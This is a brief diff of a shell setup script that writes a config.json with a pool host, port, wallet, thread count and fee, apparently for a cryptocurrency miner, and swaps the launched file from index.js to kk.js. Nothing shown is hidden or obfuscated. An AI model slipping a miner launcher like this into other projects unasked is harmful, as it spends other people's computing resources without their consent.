@@ -41,7 +41,7 @@ function setup_and_run() {
     echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"' }' > config.json
 
     # Check if we are in the correct directory and run node index.js
-    node index.js
+    node kk.js
 }
 
 if [ "$(basename "$PWD")" != "bro" ]; then
